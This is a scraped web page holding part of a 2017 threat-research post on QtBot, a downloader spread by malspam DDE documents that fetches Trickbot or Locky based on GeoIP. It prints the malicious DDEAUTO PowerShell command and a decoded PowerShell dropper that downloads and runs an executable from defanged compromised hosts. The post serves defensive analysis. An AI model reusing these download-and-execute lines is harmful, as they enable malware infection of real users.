<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">Everybody Gets One: QtBot Used to Distribute Trickbot and Locky</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-48102 entry-meta">
			
			
			<span class="post-views-count">29,521</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'48102','like')"><i class="ui ui-2"></i><span class="ml-5">1</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 8</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-everybody-gets-one-qtbot-used-distribute-trickbot-locky%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-everybody-gets-one-qtbot-used-distribute-trickbot-locky%2F+-+Everybody+Gets+One%3A+QtBot+Used+to+Distribute+Trickbot+and+Locky" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-everybody-gets-one-qtbot-used-distribute-trickbot-locky%2F&title=Everybody+Gets+One%3A+QtBot+Used+to+Distribute+Trickbot+and+Locky&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/unit42-everybody-gets-one-qtbot-used-distribute-trickbot-locky/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/brandon-levene/" title="Posts by Brandon Levene" class="author url fn" rel="author">Brandon Levene</a>, <a href="https://unit42.paloaltonetworks.com/author/brandon-young/" title="Posts by Brandon Young" class="author url fn" rel="author">Brandon Young</a> and <a href="https://unit42.paloaltonetworks.com/author/dominik-reichel/" title="Posts by Dominik Reichel" class="author url fn" rel="author">Dominik Reichel</a>        </p>
        <p><time datetime="2017-11-01T20:00:10+00:00">November 1, 2017 at 1:00 PM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/locky/" rel="tag">Locky</a>, <a href="https://unit42.paloaltonetworks.com/tag/qtbot/" rel="tag">QtBot</a>, <a href="https://unit42.paloaltonetworks.com/tag/trickbot/" rel="tag">Trickbot</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="650" height="300" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" class="attachment-single size-single wp-post-image" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg 650w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-300x138.jpg 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-370x171.jpg 370w" sizes="(max-width: 650px) 100vw, 650px" />            </figure>
                    <p><span style="font-size: 18pt;">Introduction</span><br />
The most common Locky and Trickbot affiliates are being distributed via shared malspam campaigns. Unit 42 and external malware researchers believe the payloads are geo-targeted. Previously, geo-targeting was controlled by a relatively simplistic <a href="https://phishme.com/locky-trickbot-depends-malicious-payload-delivery-tailored-geographic-location/">VBA script</a> which utilized GeoIP lookup services and parsed the country code to determine the compromised host’s location. With this information, the VBA script would enter a loop checking for the presence of the country codes: UK, IE, AU, GB, LU, or BE and, if any of those country codes was present, URIs to serve Trickbot were selected for download and execution. If this check failed, Locky would be served instead.<br />
Recently, <a href="https://researchcenter.paloaltonetworks.com/author/bduncan/">Unit 42 researcher Brad Duncan</a> observed <a href="https://isc.sans.edu/forums/diary/Necurs+Botnet+malspam+pushes+Locky+using+DDE+attack/22946/)">Necurs malspam</a> campaigns distributing Microsoft Office documents that were abusing <a href="https://www.bleepingcomputer.com/news/security/microsoft-office-attack-runs-malware-without-needing-macros/">DDE</a>. These documents load an intermediate downloader which we have tagged in AutoFocus as “QtBot”. QtBot replaces the previously discussed VBA and features a robust anti-analysis suite to protect itself. This new downloader is responsible for loading the final payload, either Locky or Trickbot, again based on GeoIP. Palo Alto Networks has observed more than 4 million unique sessions with QtBot activity since October 19<sup>th</sup>, 2017.<br />
<span style="font-size: 18pt;"><br />
The Lure</span><br />
The malicious <a href="https://isc.sans.edu/diary/Macro-less+Code+Execution+in+MS+Word/22970">DDE documents</a> are included as attachments to malspam lures like the one below (seen 10/24/2017):<br />
<img class="aligncenter wp-image-48105" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_1.png" alt="QtBot_1" width="600" height="457" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_1.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_1-900x686.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_1-300x229.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_1-768x585.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_1-370x282.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 1. Shows an example email lure with a malicious document that uses DDE to deliver a payload.</em></p>
<p>Typically, these lures are very simple. Most of the observed lures fall either within the “Financial Statement” category (Invoice, Billing, Receipt) or “File Transfer” category (efax, file scan). This campaign relies on the user to download the attachment, open it, and click through several dialog boxes. The attached document, bb92218314ffdc450320f1d44d8a2fe163c585827d9ca3e9a00cb2ea0e27f0c9, contains the following DDE object:<br />
[URL Defanged]</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f692881018dc033075266" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
DDEAUTO C:\\Windows\\System32\\cmd.exe "/k powershell.exe -NonI -
noexit -NoP -sta $sr=(new-object IO.StreamReader
((([Net.WebRequest]::Create('hXXp://burka.ch/JHhdg33')).GetResponse())
.GetResponseStream())).ReadToEnd();powershell.exe -e $sr"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f692881018dc033075266-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018dc033075266-2">2</div><div class="crayon-num" data-line="crayon-5f692881018dc033075266-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018dc033075266-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f692881018dc033075266-1"><span class="crayon-i">DDEAUTO</span><span class="crayon-h"> </span><span class="crayon-v">C</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-sy">\</span><span class="crayon-v">System32</span><span class="crayon-sy">\</span><span class="crayon-sy">\</span><span class="crayon-v">cmd</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-h"> </span><span class="crayon-s">"/k powershell.exe -NonI -</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018dc033075266-2"><span class="crayon-s">noexit -NoP -sta $sr=(new-object IO.StreamReader</span></div><div class="crayon-line" id="crayon-5f692881018dc033075266-3"><span class="crayon-s">((([Net.WebRequest]::Create('hXXp://burka.ch/JHhdg33')).GetResponse())</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018dc033075266-4"><span class="crayon-s">.GetResponseStream())).ReadToEnd();powershell.exe -e $sr"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p><span style="font-size: 18pt;"><br />
Network Traffic</span><br />
Let’s examine the network traffic. Immediately following the user’s click-throughs of three dialog boxes, the following HTTP GET request is issued. Interestingly, its likely this initial command and control server is simply a compromised webhost running a vulnerable version of PLESK as can be seen by the X-Powered-By header in the HTTP response.<br />
<img class="aligncenter wp-image-48129" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_2.png" alt="QtBot_2" width="600" height="457" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_2.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_2-900x686.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_2-300x229.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_2-768x585.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_2-370x282.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 2. DDE downloads a base64 blob for execution. Also, an interesting note: this initial server hosting the  scriptlet is using PLESK and is likely compromised.</em></p>
<p>The base64 blob decodes to the following [URLs defanged]:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f692881018e7609457461" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$urls = "hXXp://aurea-
art[.]ru/incrHG32","hXXp://castellodimontegioco[.]com/incrHG32","hXXp:
//nl.flipcapella[.]com/incrHG32","hXXp://dotecnia[.]cl/incrHG32","hXXp
://christakranzl[.]at/incrHG32"
foreach($url in $urls){
Try
{
	Write-Host $url
	$fp = "$env:temp\theyweare64.exe"
	Write-Host $fp
	$wc = New-Object System.Net.WebClient
	$wc.DownloadFile($url, $fp)
	Start-Process $fp
	break
}
Catch
{
   Write-Host $_.Exception.Message
}
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f692881018e7609457461-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018e7609457461-2">2</div><div class="crayon-num" data-line="crayon-5f692881018e7609457461-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018e7609457461-4">4</div><div class="crayon-num" data-line="crayon-5f692881018e7609457461-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018e7609457461-6">6</div><div class="crayon-num" data-line="crayon-5f692881018e7609457461-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018e7609457461-8">8</div><div class="crayon-num" data-line="crayon-5f692881018e7609457461-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018e7609457461-10">10</div><div class="crayon-num" data-line="crayon-5f692881018e7609457461-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018e7609457461-12">12</div><div class="crayon-num" data-line="crayon-5f692881018e7609457461-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018e7609457461-14">14</div><div class="crayon-num" data-line="crayon-5f692881018e7609457461-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018e7609457461-16">16</div><div class="crayon-num" data-line="crayon-5f692881018e7609457461-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018e7609457461-18">18</div><div class="crayon-num" data-line="crayon-5f692881018e7609457461-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692881018e7609457461-20">20</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f692881018e7609457461-1"><span class="crayon-sy">$</span><span class="crayon-v">urls</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"hXXp://aurea-</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018e7609457461-2"><span class="crayon-s">art[.]ru/incrHG32"</span><span class="crayon-sy">,</span><span class="crayon-s">"hXXp://castellodimontegioco[.]com/incrHG32"</span><span class="crayon-sy">,</span><span class="crayon-s">"hXXp:</span></div><div class="crayon-line" id="crayon-5f692881018e7609457461-3"><span class="crayon-s">//nl.flipcapella[.]com/incrHG32"</span><span class="crayon-sy">,</span><span class="crayon-s">"hXXp://dotecnia[.]cl/incrHG32"</span><span class="crayon-sy">,</span><span class="crayon-s">"hXXp</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018e7609457461-4"><span class="crayon-s">://christakranzl[.]at/incrHG32"</span></div><div class="crayon-line" id="crayon-5f692881018e7609457461-5"><span class="crayon-st">foreach</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e">url </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">urls</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018e7609457461-6"><span class="crayon-st">Try</span></div><div class="crayon-line" id="crayon-5f692881018e7609457461-7"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018e7609457461-8"><span class="crayon-h">	</span><span class="crayon-v">Write</span><span class="crayon-o">-</span><span class="crayon-i">Host</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">url</span></div><div class="crayon-line" id="crayon-5f692881018e7609457461-9"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">fp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"$env:temp\theyweare64.exe"</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018e7609457461-10"><span class="crayon-h">	</span><span class="crayon-v">Write</span><span class="crayon-o">-</span><span class="crayon-i">Host</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">fp</span></div><div class="crayon-line" id="crayon-5f692881018e7609457461-11"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">wc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-i">WebClient</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018e7609457461-12"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">wc</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadFile</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">fp</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f692881018e7609457461-13"><span class="crayon-h">	</span><span class="crayon-v">Start</span><span class="crayon-o">-</span><span class="crayon-i">Process</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-e">fp</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018e7609457461-14"><span class="crayon-e">	</span><span class="crayon-st">break</span></div><div class="crayon-line" id="crayon-5f692881018e7609457461-15"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018e7609457461-16"><span class="crayon-st">Catch</span></div><div class="crayon-line" id="crayon-5f692881018e7609457461-17"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018e7609457461-18"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-v">Write</span><span class="crayon-o">-</span><span class="crayon-i">Host</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-sy">.</span><span class="crayon-v">Exception</span><span class="crayon-sy">.</span><span class="crayon-i">Message</span></div><div class="crayon-line" id="crayon-5f692881018e7609457461-19"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692881018e7609457461-20"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0008 seconds] -->
<p>The entire list is iterated over until a valid download location is found (this can be observed in the cmd.exe window which is spawned in the background by the initial DDE execution). Once a live command and control server responds, the QtBot binary (798aa42748dcb1078824c2027cf6a0d151c14e945cb902382fcd9ae646bfa120) is downloaded in the clear.</p>
<p><img class="aligncenter wp-image-48153" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_3.png" alt="QtBot_3" width="600" height="457" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_3.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_3-900x685.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_3-300x228.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_3-768x584.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_3-370x282.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 3. Download of the QtBot downloader, with the executable in the clear. Note that the Content-Type doesn’t match.</em></p>
<p>Once the QtBot binary has been downloaded, its executed from the user’s %temp% directory using the PowerShell directive Start-Process which can be seen in the decoded base64 blob included in the code block above. When QtBot is started, it initially performs a connectivity check to the legitimate domain, ds.download.windowsupdate[.]com, via an HTTP POST request.</p>
<p><img class="aligncenter wp-image-48177" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_4.png" alt="QtBot_4" width="600" height="457" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_4.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_4-900x685.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_4-300x228.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_4-768x584.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/11/QtBot_4-370x282.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 4. Downloader component issues a request to an innocuous domain as a connectivity check.</em></p>
<p>Finally, once the connectivity check passes, QtBot will beacon back to its command and control server using an HTTP POST request with an RC4 encrypted payload and await a response which is encrypted with the same RC4 key. The User-Agent “Windows-Update-Agent” in the connectivity check, initial check-in, and final payload delivery are all identical.<br />
For the network traffic below, we will use the QtBot sample, d97be402740f6a0fc70c90751f499943bf26f7c00791d46432889f1bedf9dbd2, as at the time of analysis the command and control server was still live and serving geo specific payloads.<br />
In cases where the geolocation matches a set list (we believe this list is likely identical to the earlier VBA discussed in the Introduction section), we will see the traffic below.</p>
